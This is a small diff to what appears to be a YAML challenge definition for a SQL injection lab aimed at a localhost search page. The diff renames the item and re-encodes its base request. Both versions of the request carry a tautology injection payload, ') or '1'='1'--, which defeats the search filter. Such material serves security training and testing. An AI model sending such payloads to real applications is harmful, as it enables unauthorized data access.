@@ -1,4 +1,4 @@
-name: 'SQL Injection (Search)'
+name: 'SQL Injection (Search) 1'
 type: 'exploit'
 
 text: |-
@@ -18,7 +18,7 @@ target:
     port: 80
 
 base_request: |-
-  GET /?search=nebula')+or+'1'='1'-- HTTP/1.1
+  GET /?search=nebula')%20or%20'1'='1'-- HTTP/1.1
   Host: localhost
 
 rules:
